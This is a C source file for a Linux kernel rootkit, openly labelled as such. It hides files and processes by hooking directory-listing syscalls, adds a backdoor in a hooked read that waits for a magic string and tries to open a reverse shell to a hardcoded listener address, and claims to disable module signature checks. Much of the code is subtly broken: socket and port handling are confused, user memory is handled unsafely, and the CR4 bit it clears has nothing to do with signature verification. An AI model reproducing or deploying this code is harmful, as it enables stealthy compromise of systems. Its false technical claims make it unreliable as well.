#include <linux/init.h>
#include <linux/module.h>
#include <linux/kprobes.h>
#include <linux/dirent.h>
#include <linux/uaccess.h>
#include <linux/string.h>
#include <linux/fs.h>
#include <linux/syscalls.h>
#include <linux/net.h>
#include <linux/in.h>
#include <net/sock.h>
#include <linux/tcp.h>
#include <linux/inet.h>
#include <linux/sched.h>
#include <linux/fdtable.h>
#include <linux/unistd.h>
#include <linux/file.h>
#include <linux/crypto.h>
#include <linux/scatterlist.h>
#include <crypto/hash.h>
#include <linux/kconfig.h>
#include <asm/msr.h>
#include <asm/special_insns.h>

// Define the process name and file name to hide
#define HIDDEN_PROCESS_NAME "grisun0"
#define HIDDEN_FILE_NAME "grisun0"
#define LISTENER_IP "10.10.14.10"  // IP del servidor al que se conectará la reverse shell
#define LISTENER_PORT 3333  // Puerto del servidor al que se conectará la reverse shell
#define SPECIAL_STRING "grisiscomebacksayknokknok"
#define SPECIAL_STRING_PORT 4444  // Puerto para escuchar la cadena especial

// Original system call functions
asmlinkage long (*original_getdents)(unsigned int fd, struct linux_dirent64 __user *dirent, unsigned int count);
asmlinkage long (*original_getdents64)(unsigned int fd, struct linux_dirent64 __user *dirent, unsigned int count);
asmlinkage ssize_t (*original_read)(int fd, void __user *buf, size_t count);

// Define regs_override_return function
static inline void regs_override_return(struct pt_regs *regs, long new_ret) {
    regs->ax = new_ret;
}

// Prototypes for hooked functions
static int hooked_getdents(struct kretprobe_instance *ri, struct pt_regs *regs);
static int hooked_getdents64(struct kretprobe_instance *ri, struct pt_regs *regs);
static int hooked_read(struct kretprobe_instance *ri, struct pt_regs *regs);

// Kretprobe structures
static struct kretprobe kretprobe_getdents = {
    .handler = hooked_getdents,
    .kp = {
        .symbol_name = "sys_getdents",
    },
};

static struct kretprobe kretprobe_getdents64 = {
    .handler = hooked_getdents64,
    .kp = {
        .symbol_name = "sys_getdents64",
    },
};

static struct kretprobe kretprobe_read = {
    .handler = hooked_read,
    .kp = {
        .symbol_name = "sys_read",
    },
};

// Hooked getdents function
static int hooked_getdents(struct kretprobe_instance *ri, struct pt_regs *regs) {
    struct linux_dirent64 __user *dirent = (struct linux_dirent64 __user *)regs->si;
    long ret = regs_return_value(regs);
    struct linux_dirent64 *dir;
    unsigned long offset = 0;

    if (ret <= 0) {
        return 0;
    }

    while (offset < ret) {
        dir = (void *)dirent + offset;
        if (strcmp(dir->d_name, HIDDEN_PROCESS_NAME) == 0 || strcmp(dir->d_name, HIDDEN_FILE_NAME) == 0) {
            // Hide the process or file by removing it from the directory listing
            memmove(dirent + offset, dirent + offset + dir->d_reclen, ret - (offset + dir->d_reclen));
            ret -= dir->d_reclen;
            continue;
        }
        offset += dir->d_reclen;
    }

    regs_override_return(regs, ret);
    return 0;
}

// Hooked getdents64 function
static int hooked_getdents64(struct kretprobe_instance *ri, struct pt_regs *regs) {
    struct linux_dirent64 __user *dirent = (struct linux_dirent64 __user *)regs->si;
    long ret = regs_return_value(regs);
    struct linux_dirent64 *dir;
    unsigned long offset = 0;

    if (ret <= 0) {
        return 0;
    }

    while (offset < ret) {
        dir = (void *)dirent + offset;
        if (strcmp(dir->d_name, HIDDEN_PROCESS_NAME) == 0 || strcmp(dir->d_name, HIDDEN_FILE_NAME) == 0) {
            // Hide the process or file by removing it from the directory listing
            memmove(dirent + offset, dirent + offset + dir->d_reclen, ret - (offset + dir->d_reclen));
            ret -= dir->d_reclen;
            continue;
        }
        offset += dir->d_reclen;
    }

    regs_override_return(regs, ret);
    return 0;
}

// Hooked read function to create a backdoor
static int hooked_read(struct kretprobe_instance *ri, struct pt_regs *regs) {
    int fd = (int)regs->di;
    void __user *buf = (void __user *)regs->si;
    size_t count = (size_t)regs->dx;
    char *backdoor_message = "Backdoor activated!\n";
    char buffer[1024];
    int bytes_received;
    struct socket *sock;
    struct sockaddr_in listener_addr;
    int result;
    char *argv[] = {"/bin/sh", "-i", NULL};
    char *envp[] = {NULL};

    // Check if the read is from a specific file descriptor (e.g., a socket)
    if (fd == SPECIAL_STRING_PORT) { // Example fd for a backdoor socket
        bytes_received = original_read(fd, buffer, sizeof(buffer) - 1);
        if (bytes_received > 0) {
            buffer[bytes_received] = '\0';
            if (strstr(buffer, SPECIAL_STRING) != NULL) {
                printk(KERN_INFO "Special string found: %s\n", buffer);

                result = sock_create(PF_INET, SOCK_STREAM, IPPROTO_TCP, &sock);
                if (result < 0) {
                    printk(KERN_INFO "Socket creation failed\n");
                    return -EFAULT;
                }

                listener_addr.sin_family = AF_INET;
                listener_addr.sin_port = htons(LISTENER_PORT);
                listener_addr.sin_addr.s_addr = in_aton(LISTENER_IP);

                result = sock->ops->connect(sock, (struct sockaddr *)&listener_addr, sizeof(listener_addr), 0);
                if (result < 0) {
                    printk(KERN_INFO "Socket connect failed\n");
                    sock_release(sock);
                    return -EFAULT;
                }

                // Execute shell
                call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);

                sock_release(sock);
            }
        }
        if (copy_to_user(buf, backdoor_message, strlen(backdoor_message))) {
            return -EFAULT;
        }
        return strlen(backdoor_message);
    }

    return original_read(fd, buf, count);
}

// Function to disable module signature verification
static void disable_module_signature_verification(void) {
    unsigned long cr4;

    // Read the current value of CR4
    asm volatile("mov %%cr4, %0" : "=r" (cr4));

    // Clear the FSGSBASE bit in CR4
    cr4 &= ~X86_CR4_FSGSBASE;

    // Write the modified value back to CR4
    asm volatile("mov %0, %%cr4" :: "r" (cr4));
}

// Function to hook system calls
static int __init hook_syscalls(void) {
    // Disable module signature verification
    disable_module_signature_verification();

    // Register kretprobes
    register_kretprobe(&kretprobe_getdents);
    register_kretprobe(&kretprobe_getdents64);
    register_kretprobe(&kretprobe_read);

    return 0;
}

// Function to unhook system calls
static void __exit unhook_syscalls(void) {
    // Unregister kretprobes
    unregister_kretprobe(&kretprobe_getdents);
    unregister_kretprobe(&kretprobe_getdents64);
    unregister_kretprobe(&kretprobe_read);
}

module_init(hook_syscalls);
module_exit(unhook_syscalls);

MODULE_LICENSE("GPL");
MODULE_DESCRIPTION("Enhanced Linux Rootkit Example");
MODULE_AUTHOR("Educational Purpose");
